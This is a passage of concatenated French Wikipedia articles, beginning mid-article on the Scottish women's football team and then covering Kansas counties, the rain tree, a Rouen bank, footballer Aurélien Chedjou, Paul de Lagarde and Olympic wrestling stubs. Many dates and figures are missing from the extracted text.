L'Écosse se qualifie pour la première fois de son histoire à une phase finale de championnat d'Europe à l'occasion de l'Euro 2017 organisé aux Pays-Bas. Placée dans le groupe D en compagnie de l'Angleterre, de l'Espagne et du Portugal, elle termine à la place et est éliminée dès le premier tour, avec un bilan d'une victoire (1-0 contre l'Espagne) et deux défaites (0-6 contre l'Angleterre et 1-2 contre le Portugal).
Lors du dernier match des pour la Coupe du Monde 2019, l'Écosse s'impose 2-1 contre l'Albanie et, grâce au nul de la Suisse face à la Pologne, se qualifie pour la phase finale. C'est la première fois de leur histoire que les Écossaises accèdent à une phase finale de Coupe du Monde.
Lors de la Coupe du monde 2019, l'Écosse se retrouve dans le groupe D avec Angleterre, le Japon et l'Argentine. Malgré une belle résistance lors des deux premiers matchs, les Écossaises sont à chaque fois défaites d'une courte tête par les deux favorites du groupe, d'abord par les "Lionesses" (1-2), puis par le Japon sur le même score lors de la seconde journée. L'Écosse, déjà défaite à deux reprises, pensait avoir réalisé le plus dur en menant 3-0 à la minute face à l'Argentine lors du dernier match, mais les Sud-Américaines réaliseront une "remontada" en inscrivant 3 buts dans les 16 dernières minutes de la partie, dont un penalty à retirer dans les arrêts de jeu du match à la suite d'une consultation de la VAR pour une position avancée de la gardienne écossaise qui n'avait pas au moins un pied sur sa ligne. Dernière du groupe avec un point et plus mauvaise défense du groupe avec 7 buts encaissés, l'Écosse est éliminée dès le mais l'Argentine, qui avait besoin d'inscrire un quatrième but pour se qualifier et même chiper la seconde place aux Japonaises grâce à un meilleur goal-average, est finalement troisième avec 2 points et ne parvient pas à finir parmi les quatre meilleurs troisièmes, les rencontres Cameroun/Nouvelle-Zélande du groupe E et Thaïlande/Chili du groupe F disputées le lendemain ne s'étant pas conclues sur des scores de parité.
Parcours.
Plainte contre la fédération en 2022-2023.
Peu de temps après leur élimination des qualifications pour la Coupe du monde 2023, les joueuses internationales écossaises annoncent porter plainte contre la fédération écossaise de football. L'objectif des joueuses est d'obtenir de meilleures conditions de travail et une revalorisation financière de leur mise à disposition auprès de l'équipe nationale. Outre une très grosse inégalité salariale avec l'équipe masculine, les internationales se battent pour que la fédération leur procure des installations meilleure qualité pour elles et pour les équipes de jeunes, une égalité de traitement lors des voyages et des équipes médicales et nutritionnelles mieux dimensionnées.
Cette action en justice est abandonnée en septembre 2023 après de fructueuses discussions avec la fédération écossaise.

</doc>
<doc id="1873207" url="https://fr.wikipedia.org/wiki?curid=1873207" title="Missy Monroe">
Missy Monroe

Missy Monroe, née le à Las Vegas, est une actrice pornographique américaine.
Biographie.
Elle grandit à Las Vegas dans une famille pauvre. Elle fait des petits boulots et expérimente la drogue (marijuana).
En 2003, elle fait du Striptease au "Cheetah's Topless Club", des photos de nu et commence sa carrière d'actrice.
À 19 ans elle est très vite connue pour ses scènes hardcore (fellations, éjaculations faciales, double pénétration, ingestion d'éjaculations multiples…) comme dans les films "Gang Bang 3" de Red Light District ou en 2005 dans "Baker's Dozen 2".
En 2007 elle a un enfant.

</doc>
<doc id="1873215" url="https://fr.wikipedia.org/wiki?curid=1873215" title="Tutus">
Tutus



</doc>
<doc id="1873217" url="https://fr.wikipedia.org/wiki?curid=1873217" title="Comté de Cowley (Kansas)">
Comté de Cowley (Kansas)

Le comté de Cowley est l’un des 105 comtés de l’État du Kansas, aux États-Unis, à la frontière avec l’Oklahoma. Fondé le , il a été nommé en hommage au lieutenant Matthew Cowley.
Siège et plus grande ville : Winfield.

</doc>
<doc id="1873222" url="https://fr.wikipedia.org/wiki?curid=1873222" title="Comté de Cowley">
Comté de Cowley

Comté de Cowley désigne :
Le comté de Cowley, Nouvelle-Galles du Sud.
Le comté de Cowley, au Kansas.

</doc>
<doc id="1873224" url="https://fr.wikipedia.org/wiki?curid=1873224" title="Charles de la Hueterie">
Charles de la Hueterie



</doc>
<doc id="1873229" url="https://fr.wikipedia.org/wiki?curid=1873229" title="Samanea saman">
Samanea saman

"Samanea saman" (anciennement appelé "Albizia saman"), l'arbre à pluie ou bois noir d'Haïti, est une espèce de plantes a fleurs de la famille des "Fabaceae". C'est une espèce d'arbres originaire d'Amérique du Sud.
Description.
L'« arbre à pluie » peut monter jusqu'à 25 m de haut. Il a un port très large, sa forme est comparable à un parasol dont le diamètre peut mesurer jusqu'à 40 m.
Sur le jeune arbre l'écorce est grise à brun grisâtre, lisse, puis devient rugueuse et fissurée, laissant apparaître la jeune écorce interne, brun clair à gris rose. Le bois, tendre et léger, possède un aubier jaunâtre et un duramen brun chocolat qui devient brun doré au séchage et présente des rayures noires. Sur les sites secs, l'arbre est profondément enraciné, cherchant la nappe phréatique ; sur les sols humides, son système racinaire s'étend horizontalement et devient extrêmement plat.
Dans les forêts tropicales ombrophiles l'« arbre à pluie » a des feuilles persistantes, mais les perd à chaque saison sèche dans les savanes ou les forêts sèches : l'arbre peut rester sans feuilles pendant deux mois. Les feuilles sont doubles pennées et alternes. Elles mesurent 25 à 40 centimètres de long avec des tiges finement poilues. Les pinnates portent 2 à 10 paires de pinnules de 10 cm de long et de 5 cm de large. Les folioles sont entières, en losange asymétrique, ont une extrémité minuscule et sont effilées à la base en pointe. Le sommet est un peu plus foncé que le fond finement poilu.
Une particularité de l'arbre à pluie est le pliage nocturne des folioles opposées, qui se produit également par temps pluvieux ou par temps couvert.
Cette position de « sommeil » commence environ 1 heure avant le coucher du soleil. Au point du jour la position normale est reprise. La rosée matinale peut alors goutter sur le sol, d'où le nom d'« arbre à pluie ». Cela entretient sous l'arbre la fraîcheur, la verdure et une fréquentation de biodiversité venant s'abreuver. L'arbre est souvent envahi de cicadelles dont les déjections fertilisent le sol autour de l'arbre. Sa croissance est relativement rapide là où les précipitations sont abondantes.
Plusieurs variétés de cet arbre sont disponibles, par exemple avec des fleurs de couleur rose rougeâtre ou crème doré.
Répartition.
L'espèce pousse dans toute la zone néotropicale. Elle a été largement introduite en Asie du sud-est et dans certaines îles du Pacifique telles Hawaï et la Nouvelle-Calédonie où elle servait autrefois à abriter les plantations de caféiers en plaine et faire de l'ombre au bétail.
Séquestration du dioxyde de carbone.
Selon une étude réalisée à l'École de foresterie de l'Institut d'agriculture de Bogor en Indonésie, un arbre mature d'un diamètre de cime de 15 mètres absorbe 28,5 tonnes de dioxyde de carbone par an.
Arbres remarquables.
Au cours de ses voyages entre 1799 et 1804 dans les Amériques, Alexander von Humboldt rencontra un arbre à pluie géant près de Maracay au Venezuela. Il a mesuré la circonférence de la couronne, haute de 19 mètres, en forme de parasol, à environ 180 m, son diamètre était d’environ 60 m, sur un tronc de 2,8 m de diamètre. Humboldt a mentionné que l'arbre aurait peu changé depuis la colonisation espagnole du Venezuela ; il l'a estimé aussi vieux que le célèbre dragonnier des îles Canaries "Dracaena draco" d'Icod de los Vinos à Tenerife.
L'arbre de Maracay, appelé "Samán de Güere", a été déclaré « monument historique » en 1933 par le président vénézuélien Juan Vicente Gómez mais a fini par tomber à la suite d'un fort orage en 2000. Tout comme le dragonnier de Tenerife, l'âge du "Samán de Güere" était indéterminé, mais selon von Humboldt, il aurait eu plus de cinq siècles aujourd'hui.
Un autre spécimen célèbre appelé « arbre à pluie du Brahmapoutre » est situé à Guwahati sur les rives du fleuve Brahmapoutre en Assam, en Inde : il possède le tronc le plus épais de tous les Samans avec environ 3,7 mètres de diamètre à hauteur de poitrine.
À Kanchanaburi, en Thaïlande, se trouve également un arbre à pluie géant dont l'âge est estimé à plus d'un siècle. Il est connu localement sous le nom de "Chamchuri-yak" (จามจุรี ยักษ์). "Chamchuri" est le nom thaï de cette espèce d'arbre, tandis que "yak" est la prononciation thaïe de "yaksha", un monstre mythique, faisant référence dans ce contexte à la taille « monstrueuse » de l'arbre, qui culmine à 20 m de hauteur pour une canopée dépassant les 51 mètres de diamètre.
Espèce envahissante.
"Albizia saman" est une espèce potentiellement invasive. C'est le cas notamment en Nouvelle-Calédonie où elle a été introduite en 1902, et où elle présente un risque modéré.

</doc>
<doc id="1873238" url="https://fr.wikipedia.org/wiki?curid=1873238" title="Jean de la Brete">
Jean de la Brete



</doc>
<doc id="1873239" url="https://fr.wikipedia.org/wiki?curid=1873239" title="Sony Center">
Sony Center



</doc>
<doc id="1873247" url="https://fr.wikipedia.org/wiki?curid=1873247" title="Semaine européenne du développement durable">
Semaine européenne du développement durable

La Semaine du développement durable puis Semaine européenne du développement durable à partir de 2015 est un événement organisé par les autorités publiques chaque année, d'abord en France puis désormais en Europe, en vue d'expliquer le développement durable au grand public, de le sensibiliser à ses enjeux, de démontrer et de favoriser les différentes formes de mobilisation concrètes, individuelles et collectives.
Histoire.
Cet événement fut lancé pour la première fois en 2003 (MEEDDM, 2009). Chaque année, un appel à projets, organisé par des collectivités locales et des organismes privés, est lancé pour favoriser l'organisation et la promotion de différents événements sur le développement durable :
La mission.
La Semaine du développement durable ou SEDD s'inscrit dans l'Agenda 2030 des Nations unies et ses 17 objectifs. 
Les différentes éditions.
En 2012, le ministère chargé du développement durable a choisi le slogan : « Soyons tous consom’acteurs ». L’objectif est de faire connaître l’information environnementale qui nous aide à devenir progressivement des consommateurs éclairés.
En 2015, la « Semaine du développement durable » devient la « Semaine européenne du développement durable » et se déroule du au .
La Semaine européenne du développement durable se déroule désormais chaque année du 18 septembre au 8 octobre.

</doc>
<doc id="1873250" url="https://fr.wikipedia.org/wiki?curid=1873250" title="Synedrella nodiflora">
Synedrella nodiflora

Synedrella nodiflora est une espèce de plante à fleurs de la famille des "Asteraceae" et du genre "Synedrella".

</doc>
<doc id="1873252" url="https://fr.wikipedia.org/wiki?curid=1873252" title="Gaoth Dobhair">
Gaoth Dobhair

Gaoth Dobhair (le nom est régulièrement anglicisé en Gweedore, même si cette dénomination n'est pas d’officielle) est un petit district (ou paroisse) situé sur la côte nord de l'Atlantique, dans le Comté de Donegal, en Irlande. Elle est officiellement la plus grande paroisse de langue irlandaise en Irlande avec une population d'environ . Des studios de la section locale de la radio en gaélique RTÉ RnaG, ainsi que d'un campus externe de la National University of Ireland, Galway sont installés sur son territoire. Gaoth Dobhair (qui ne possède pas de bourg) se compose des hameaux de Bunbeg, Derrybeg, Dunlewey, Crolly et Brinalack, et est en contrebas du plus haut sommet du Donegal, le mont Errigal.
Gaoth Dobhair est connu pour être le berceau de la culture irlandaise, avec les vieilles coutumes irlandaises, musique traditionnelle, théâtre, sports gaéliques et la langue irlandaise en jouant un rôle central et primordial dans la vie de la population locale. Ceci, avec ses paysages et ses nombreuses plages, a fait de cette région une destination touristique populaire, en particulier avec des visiteurs venus d'Irlande du Nord.
Gaoth Dobhair fait partie d'un Gaeltacht, une région où l’irlandais est parlé au quotidien par les habitants.

</doc>
<doc id="1873254" url="https://fr.wikipedia.org/wiki?curid=1873254" title="Demokratik Halk Partisi">
Demokratik Halk Partisi



</doc>
<doc id="1873255" url="https://fr.wikipedia.org/wiki?curid=1873255" title="Comté de Stanton (Kansas)">
Comté de Stanton (Kansas)

Le comté de Stanton est l’un des 105 comtés de l’État du Kansas, aux États-Unis, à la frontière avec le Colorado. Fondé le 17 juin 1887, il a été nommé en hommage à l'homme politique Edwin M. Stanton.
Siège et plus grande ville : Johnson City.

</doc>
<doc id="1873256" url="https://fr.wikipedia.org/wiki?curid=1873256" title="Jean-Charles Roman d'Amat">
Jean-Charles Roman d'Amat

Jean-Charles Roman d'Amat ( – ) est un bibliothécaire et historien français. Il dirige notamment l'édition du "".
Biographie.
Fils de Joseph Roman, avec ses deux frères Bernard et Jacques, il est autorisé à ajouter le nom d'« Amat », éteint et porté par sa grand-mère paternelle ; il se fait quant à lui appeler « Roman d'Amat ».
Il obtient son diplôme d'archiviste paléographe avec une thèse de l'École des chartes soutenue en 1911 et intitulée "Les chartes de l’ordre dauphinois et provençal de Chalais". Il devient conservateur adjoint à la Bibliothèque nationale.
Il signe ses œuvres d'abord sous le nom de Joseph-Charles Roman, ou Jean-Charles Roman, puis la plupart d'entre elles paraissent sous le nom de Jean-Charles Roman d'Amat.
Roman d'Amat est surtout connu comme l'un des directeurs du "" (DBF), dont le premier volume paraît en 1933.
Il meurt à Versailles le .
Vie personnelle.
Il épouse Pierrette Lucie Frédérique Thomas, à Versailles le . Trois enfants naissent de cette union, Patrice et Jean-Gabriel et Béatrice.
Veuf, il se remarie le avec Marie Thérèse Dulac à Verneuil-en-Bourbonnais. François est né de cette union.

</doc>
<doc id="1873257" url="https://fr.wikipedia.org/wiki?curid=1873257" title="Millet Partisi">
Millet Partisi



</doc>
<doc id="1873259" url="https://fr.wikipedia.org/wiki?curid=1873259" title="Poupard (auteur)">
Poupard (auteur)

Poupard, nom de plume d’Alexandre Mermin, né le à Grenoble (Isère) est un dessinateur de bande dessinée et illustrateur français.
Biographie.
Autodidacte, il publie en 1989 ses premiers dessins en tant que caricaturiste et dessinateur de presse. Il a effectué des illustrations humoristiques (travaux publicitaires, cartes postales, tee-shirts, presse d'entreprise…) et réalistes (mode et du prêt-à-porter féminin).
En , il obtient et participe en novembre de l'année suivante au lancement de l'album rassemblant les trois lauréats de cette compétition.
En 1998, avec les Éditions Vents d'Ouest, il réalise deux albums comiques en noir et blanc puis, à partir de 2002, il intègre les Éditions Bamboo. Là, il dessine une histoire d'heroic fantasy humoristique en deux tomes avant de commencer une nouvelle série intitulée "Les Rugbymen".

</doc>
<doc id="1873260" url="https://fr.wikipedia.org/wiki?curid=1873260" title="Doux baisers">
Doux baisers

Doux baisers est un cocktail à base de Liqueur de framboise, d'Izarra jaune, de Vodka et de Jus d'orange.

</doc>
<doc id="1873262" url="https://fr.wikipedia.org/wiki?curid=1873262" title="Halkın Yükselişi Partisi">
Halkın Yükselişi Partisi



</doc>
<doc id="1873263" url="https://fr.wikipedia.org/wiki?curid=1873263" title="56e régiment à pied (West Essex)">
56e régiment à pied (West Essex)

Le à pied (West Essex), en anglais ", est un régiment d'infanterie de l'armée britannique qui fut actif de 1755 à 1881.
À l'origine d'un pourpre foncé, la couleur du parement de l'uniforme du régiment fut changé en 1764, année de la mort de madame de Pompadour, en violet, qui passait en Angleterre pour être sa couleur favorite. Le régiment fut alors officiellement surnommé ". Les soldats, pour leur part, préféraient affirmer que c'était la couleur des sous-vêtements de la marquise.
En 1881, le régiment fusionna avec le ' pour former le ', qui participa aux deux guerres mondiales. En héritage de son prédécesseur, ce régiment conserva le parement violet et le surnom de ' jusqu'à sa dissolution en 1958. Ensuite, c'est le du ' qui récupéra la tradition, jusqu'à sa suppression en 1992.

</doc>
<doc id="1873265" url="https://fr.wikipedia.org/wiki?curid=1873265" title="Refah Partisi">
Refah Partisi



</doc>
<doc id="1873267" url="https://fr.wikipedia.org/wiki?curid=1873267" title="Özgürlük ve Dayanışma Partisi">
Özgürlük ve Dayanışma Partisi



</doc>
<doc id="1873269" url="https://fr.wikipedia.org/wiki?curid=1873269" title="Train bleu (cocktail)">
Train bleu (cocktail)

Le Train bleu est un cocktail à base de champagne, de cognac et de jus d'ananas.
Historique.
Le "Train bleu" est un prestigieux train de luxe historique, officiellement baptisé « "Calais-Méditerranée-Express" », qui relie l'Angleterre depuis Calais, à la Côte d'Azur en longeant la mer Méditerranée, via entre autres Paris, Marseille, Cannes, Antibes, Nice, Monaco, Monte-Carlo et Menton, entre 1866 et 2007. 
En 1963 le prestigieux buffet gastronomique de Paris-Gare-de-Lyon, classé monument historique, est rebaptisé « Le Train bleu (restaurant) » en hommage au mythique Train Bleu.
Recette.
Passer une tranche d’ananas sur le bord de la flûte à champagne, puis tremper le bord dans du sucre en poudre. 
Verser directement dans la flûte le jus d'ananas, le cognac puis le champagne.
Servir avec un cube d'ananas.
Variante.
Le restaurant gastronomique "Le Train bleu" propose une variante de couleur bleue de la recette, différente de l'originale avec un mélange de Grey Goose vodka poire, vin blanc et curaçao bleu.

</doc>
<doc id="1873271" url="https://fr.wikipedia.org/wiki?curid=1873271" title="Comté de Stanton">
Comté de Stanton

Comté de Stanton désigne deux comtés américains :
Le comté de Stanton, Kansas ;
Le comté de Stanton, Nebraska.

</doc>
<doc id="1873273" url="https://fr.wikipedia.org/wiki?curid=1873273" title="Fazilet Partisi">
Fazilet Partisi



</doc>
<doc id="1873275" url="https://fr.wikipedia.org/wiki?curid=1873275" title="Arrigastoû">
Arrigastoû

LArrigastoû ou Arrigaston, assimilable au ruisseau de Moulias, Ayguette ou Bourmassa, est un petit affluent droit du gave d'Ossau en amont de l'Escou à Oloron-Sainte-Marie.
Géographie.
L'Arrigastoû naît à Buzy sous le nom de "Bourmassà", puis, dans un mouvement parallèle au gave d'Ossau, traverse les communes de Buziet, Ogeu-les-Bains, Herrère, Escou où ses eaux sont collectées dans un réservoir.
Le trop-plein du réservoir s'écoule dans des fossés puis reforment l'Arrigastoû à Escout. Après avoir draîné Précilhon, il se perd dans le gave d'Ossau à Oloron-Sainte-Marie.
Principaux affluents.
1) Le Bourmassà, à Buziet :
2) l'Aiguette :
3) le ruisseau de Moulias ou Aiguette :
4) l'Arrigastoû

</doc>
<doc id="1873276" url="https://fr.wikipedia.org/wiki?curid=1873276" title="Genç Parti">
Genç Parti



</doc>
<doc id="1873277" url="https://fr.wikipedia.org/wiki?curid=1873277" title="Demokratik Sol Parti">
Demokratik Sol Parti



</doc>
<doc id="1873280" url="https://fr.wikipedia.org/wiki?curid=1873280" title="Demokrasi Partisi">
Demokrasi Partisi



</doc>
<doc id="1873282" url="https://fr.wikipedia.org/wiki?curid=1873282" title="Demokrat Parti">
Demokrat Parti



</doc>
<doc id="1873287" url="https://fr.wikipedia.org/wiki?curid=1873287" title="Maupin">
Maupin

Voir aussi.
Maupin peut également désigner :

</doc>
<doc id="1873289" url="https://fr.wikipedia.org/wiki?curid=1873289" title="EasyOS">
EasyOS

EasyOS est une distribution Linux créée par la société Neuf Cegetel pour son EasyGate qui met l'accent sur la simplicité d'utilisation et la légèreté. Ce système d'exploitation est entièrement basé sur des logiciels libres, les logiciels développés par Neuf Cegetel étant placés sous licence GNU GPL.
Interfaces.
L'EasyOS permet à l'utilisateur de choisir parmi 3 niveaux de navigation en fonction de son expérience.
Easy.
Easy est une interface en 3 dimensions permettant une navigation intuitive.
Ergo.
Il s'agit de l'interface par défaut. Elle offre une navigation simplifiée mais plus complète que l'interface Easy.
Expert.
Articulée autour de Xfwm 4 (le gestionnaire de fenêtres de Xfce), cette interface est plus classique, conforme à la navigation habituelle.

</doc>
<doc id="1873293" url="https://fr.wikipedia.org/wiki?curid=1873293" title="Comté d'Osborne">
Comté d'Osborne

Le comté d’Osborne est l’un des 105 comtés de l’État du Kansas, aux États-Unis. Fondé le 26 février 1867, il porte le nom de Vincent B. Osborne, un des premiers occupants de la région.
Siège et plus grande ville : Osborne.

</doc>
<doc id="1873303" url="https://fr.wikipedia.org/wiki?curid=1873303" title="Acrobates (genre)">
Acrobates (genre)



</doc>
<doc id="1873310" url="https://fr.wikipedia.org/wiki?curid=1873310" title="Comptoir d'escompte de Rouen">
Comptoir d'escompte de Rouen

Le Comptoir national d'escompte de Rouen est une ancienne banque française.
Historique.
Le Comptoir d'escompte de Rouen fondé en 1848 par Michel "Théodore" Le Picard (1789-1856), manufacturier et filateur rouennais. Son père, Jacques "Guillaume" Le Picard (1736-1790), négociant et juge consul, issu d'une famille établie à Rouen depuis le , avait épousé à Rouen, en la paroisse Saint-Candé le Jeune, le "Catherine" Marie Bordier (1760-1808), fille d'un avocat du roi au parlement de Normandie. Théodore était marié à la fille du maire Vincent Prosper Ribard, puis à Aimée Le Couteulx de Verclives (petite-fille du maire Antoine Le Couteulx de Verclives et de Martin-Pierre Foache).
« Type même de la vieille banque locale sans autre implantation que son siège social », l'établissement rouennais occupait, place de la Pucelle, l'hôtel de Bourgtheroulde, où il s'était établi dès sa fondation, en 1848, et qu'il finit par acquérir en 1885, « de la famille Matheus ».
Longtemps appelé le « Comptoir Le Picard », du nom de son fondateur, le "Comptoir national d'escompte de la ville de Rouen" - ainsi que le nomme l'arrêté ministériel du , prorogeant pour trois ans celui du qui l'avait initialement autorisé à exercer le commerce de la banque - « assura sa prospérité sur une prudence que l'on trouverait de nos jours excessive en matière de crédit », ne prêtant qu'à court terme et s'interdisant « tous achats de fonds publics ou valeurs industrielles pour le compte de la société... toute spéculation en marchandises et toute participation dans tous établissements, commerce et industrie quelconque ». Mais « cette discrétion et cette réputation [plaisaient] aux Rouennais et aux inspecteurs de la Banque de France qui [mettaient] en avant la « bonne et sage maison » dont les directeurs [réunissaient]... toutes les garanties souhaitables ».
« À Rouen - écrivit en 1927 André Maurois dans son "Discours d'un vieux rouennais" -, changer [...] est un grand crime [...]. Quand le maréchal Lyautey vint [...] l'an dernier, la municipalité le reçut à la gare avec un vieux landau aux portes disjointes, sur le siège duquel était un vieux cocher, assis à côté d'un vieil huissier, tous deux vêtus de vieux uniformes, et les Rouennais massés sur le passage constatèrent avec satisfaction que le maréchal était reçu en 1926, comme l'empereur l'avait été en 1860, comme le roi en 1845, comme le président (s'il existe encore) sera reçu en 1960, enfin que Rouen n'avait pas changé, malgré la grande folie des peuples de la terre… ». À cet égard, le Comptoir d'escompte était des plus rouennais... « Il y a trois choses dont les Rouennais n'imaginent pas se séparer - ajoutait-il - : Journal de Rouen, l'Ancienne Mutuelle et le Comptoir d'Escompte ».
De fait, tout au long de la seconde moitié du , le Comptoir d'escompte de Rouen se présenta comme la « première maison de banque » de la ville, « bénéficiant d'une clientèle fidèle et bien établie allant des industriels du textile aux commissionnaires en coton, en passant par les négociants du port ». Jusqu'à son absorption par le Crédit industriel et commercial, en 1935, il ne fut d'ailleurs dirigé que par des Rouennais dont en premier lieu Théodore Le Picard lui-même, Henri Dumont (1830-1888) ou Joseph "Albert", baron de Rothiacob (1850-1931), petit-fils de Théodore Le Picard.

</doc>
<doc id="1873313" url="https://fr.wikipedia.org/wiki?curid=1873313" title="Aurélien Chedjou">
Aurélien Chedjou

Aurélien Chedjou, né le à Douala, est un ancien footballeur international camerounais qui évoluait au poste de défenseur central.
Biographie.
Carrière en club.
Lors de la saison 2007-2008, Chedjou s'impose peu à peu dans la défense centrale de l'équipe CFA du LOSC, ne participant qu'à deux matchs avec l'équipe première.
Profitant des blessures et des suspensions, il gagne du temps de jeu lors du début de saison 2008-2009 et devient une alternative crédible. Il participe notamment aux campagnes de Ligue Europa, atteignant les 1/ de finale en 2009-2010 contre Liverpool.
En club, le joueur s'impose progressivement comme un titulaire indiscutable au côté d'Adil Rami, Ricardo Costa, puis Marko Baša.
Le , il participe à la première victoire du Lille OSC en Coupe de France depuis 1955. La même année, la formation nordiste est sacrée championne de France.
Le , le club turc de Galatasaray annonce l'arrivée de Chedjou. Il signe pour 4 ans et contre d'indemnité de transfert. Il marque son premier but en championnat contre le club de Kayserispor. Dès 2013, il ajoute la Supercoupe de Turquie à son palmarès, puis remporte en 2014 la Coupe de Turquie, et en 2015 le championnat.
Il signe le 5 juin 2017 à l'İstanbul Başakşehir pour une durée de 3 ans.
Chedjou s'engage à l'Amiens SC le pour deux saisons.
Le 26 septembre 2020, il s'est officiellement engagé avec l'Adána Demirspor, équipe de deuxième division turque.
En , après un an sans club, il annonce sa retraite.
Lors de l'été 2025, il rejoint son ancien club de Lille OSC intègre le staff de l'académie du Domaine de Luchin au poste de technicien chargé du suivi post-formation.
Sélection.
Le , il est appelé pour la première fois en équipe du Cameroun. Il participe à la Coupe d'Afrique des nations en 2010 perdu en quart de finale, suivi des Coupe du monde 2010 puis 2014, et de la Coupe d'Afrique des nations en 2015 éliminé au premier tour.

</doc>
<doc id="1873317" url="https://fr.wikipedia.org/wiki?curid=1873317" title="Stations de radio">
Stations de radio



</doc>
<doc id="1873318" url="https://fr.wikipedia.org/wiki?curid=1873318" title="Lutte aux Jeux olympiques d'été de 1992">
Lutte aux Jeux olympiques d'été de 1992

Lutte aux Jeux olympiques d'été de 1992.

</doc>
<doc id="1873319" url="https://fr.wikipedia.org/wiki?curid=1873319" title="Lutte aux Jeux olympiques d'été de 1988">
Lutte aux Jeux olympiques d'été de 1988



</doc>
<doc id="1873321" url="https://fr.wikipedia.org/wiki?curid=1873321" title="Lutte aux Jeux olympiques d'été de 1984">
Lutte aux Jeux olympiques d'été de 1984



</doc>
<doc id="1873322" url="https://fr.wikipedia.org/wiki?curid=1873322" title="Lutte aux Jeux olympiques d'été de 1980">
Lutte aux Jeux olympiques d'été de 1980

La lutte fait sa dans le programme olympique lors des Jeux olympiques d'été de 1980 à Moscou.

</doc>
<doc id="1873323" url="https://fr.wikipedia.org/wiki?curid=1873323" title="Lutte aux Jeux olympiques d'été de 1976">
Lutte aux Jeux olympiques d'été de 1976



</doc>
<doc id="1873324" url="https://fr.wikipedia.org/wiki?curid=1873324" title="Lutte aux Jeux olympiques d'été de 1972">
Lutte aux Jeux olympiques d'été de 1972

Les épreuves de lutte aux Jeux olympiques d'été de 1972 se déroulent à la Ringer-Judo-Halle de Munich, en Allemagne, du 27 août au .

</doc>
<doc id="1873326" url="https://fr.wikipedia.org/wiki?curid=1873326" title="Lutte aux Jeux olympiques d'été de 1968">
Lutte aux Jeux olympiques d'été de 1968



</doc>
<doc id="1873327" url="https://fr.wikipedia.org/wiki?curid=1873327" title="Comté d'Atchison (Kansas)">
Comté d'Atchison (Kansas)

Le comté d’Atchison est l’un des 105 comtés de l’État du Kansas, aux États-Unis, à la frontière avec le Missouri. Fondé le 25 , il a été nommé en hommage au sénateur David Rice Atchison.
Siège et plus grande ville : Atchison.

</doc>
<doc id="1873328" url="https://fr.wikipedia.org/wiki?curid=1873328" title="Lutte aux Jeux olympiques d'été de 1964">
Lutte aux Jeux olympiques d'été de 1964

Les épreuves de lutte aux Jeux olympiques d'été de 1964 ont lieu au gymnase de Komazawa à Tokyo, du 11 au . Deux disciplines sont au programme, la lutte libre (8 catégories masculines) et la lutte gréco-romaine (8 catégories masculines).
La lutte a été au programme de tous les Jeux olympiques d'été modernes, à l'exception de ceux de 1900.

</doc>
<doc id="1873330" url="https://fr.wikipedia.org/wiki?curid=1873330" title="Lutte aux Jeux olympiques d'été de 1960">
Lutte aux Jeux olympiques d'été de 1960



</doc>
<doc id="1873331" url="https://fr.wikipedia.org/wiki?curid=1873331" title="Lutte aux Jeux olympiques d'été de 1956">
Lutte aux Jeux olympiques d'été de 1956



</doc>
<doc id="1873335" url="https://fr.wikipedia.org/wiki?curid=1873335" title="Lutte aux Jeux olympiques d'été de 1952">
Lutte aux Jeux olympiques d'été de 1952



</doc>
<doc id="1873336" url="https://fr.wikipedia.org/wiki?curid=1873336" title="Paul de Lagarde">
Paul de Lagarde

Paul Anton Bötticher dit Paul de Lagarde, né le à Berlin et mort le à Göttingen, est un orientaliste et un théoricien politique prussien du mouvement "völkisch", conservateur et antisémite. Ses thèses sont considérées comme ayant influencé l'idéologie nazie.
Biographie.
Né Paul Anton Bötticher, il change de nom en hommage à sa grand-tante maternelle d'origine française, Ernestine de Lagarde, qui l’avait élevé après le décès de sa mère. 
Il entame des études de théologie, de philosophie et de langues orientales à Berlin, sa ville natale (1844-1846), puis les poursuit à Halle (1846-1847), ainsi qu'à Londres (1852-1853) et à Paris (1853). 
En 1854, il devient enseignant dans une école publique berlinoise. 
En 1869, il succède à Heinrich Ewald comme professeur de langues orientales à l'université de Göttingen. Il y publie des travaux de philologie sémitique, notamment ses "Septuaginta Studien" (1891-1892).
Il exerce une grande influence dans l’Allemagne contemporaine par ses écrits nationalistes et antisémites rassemblés dans les "Deutsche Schriften" (« Écrits allemands »), parus entre 1878 et 1881. Certaines de ses idées seront reprises par les nazis, comme :
Son nationalisme repose essentiellement sur la religion. Selon Paul de Lagarde, la germanité est fondée sur « l’âme » plutôt que sur la pureté d'une race germanique, prenant l'exemple d’illustres allemands comme Leibniz, Lessing ou Kant, qui étaient d’origine slave ou écossaise. Toujours selon lui, les Juifs doivent impérativement renoncer à leur religion pour devenir des Allemands à part entière, et il ne mâche pas ses mots à leur égard dans ses "Écrits allemands". Il s'agit là d'une nette radicalisation de l’antijudaïsme ; elle annonce l’antisémitisme virulent du mouvement völkisch et du parti nazi, lequel salue d’ailleurs Lagarde comme l’un de ses inspirateurs. Rosenberg notamment le cite en décembre 1941 : .
Les idées de Paul de Lagarde illustrent la lente transition au cours du en Allemagne, d'un nationalisme libéral et romantique, au lendemain de l’aventure napoléonienne, à un nationalisme racial.

</doc>
<doc id="1873340" url="https://fr.wikipedia.org/wiki?curid=1873340" title="Lutte aux Jeux olympiques d'été de 1936">
Lutte aux Jeux olympiques d'été de 1936



</doc>
<doc id="1873341" url="https://fr.wikipedia.org/wiki?curid=1873341" title="Inventaire départemental du patrimoine naturel">
Inventaire départemental du patrimoine naturel



</doc>
<doc id="1873342" url="https://fr.wikipedia.org/wiki?curid=1873342" title="Lutte aux Jeux olympiques d'été de 1932">
Lutte aux Jeux olympiques d'été de 1932



</doc>
<doc id="1873343" url="https://fr.wikipedia.org/wiki?curid=1873343" title="Lutte aux Jeux olympiques d'été de 1948">
Lutte aux Jeux olympiques d'été de 1948

Les épreuves de lutte aux Jeux olympiques d'été de 1948 ont lieu à Londres du au . Deux disciplines sont au programme, la lutte libre (8 catégories masculines) et la lutte gréco-romaine (8 catégories masculines). 219 lutteurs de 29 nations participent à ces Jeux
La lutte a été au programme de tous les Jeux olympiques d'été modernes, à l'exception de ceux de 1900.

</doc>
<doc id="1873344" url="https://fr.wikipedia.org/wiki?curid=1873344" title="Lutte aux Jeux olympiques d'été de 1924">
Lutte aux Jeux olympiques d'été de 1924



</doc>
<doc id="1873345" url="https://fr.wikipedia.org/wiki?curid=1873345" title="INPN">
INPN



</doc>
<doc id="1873348" url="https://fr.wikipedia.org/wiki?curid=1873348" title="Lutte aux Jeux olympiques de 1920">
Lutte aux Jeux olympiques de 1920

Dix épreuves de lutte eurent lieu à l'occasion des Jeux olympiques d'été de 1920 à Anvers.

</doc>
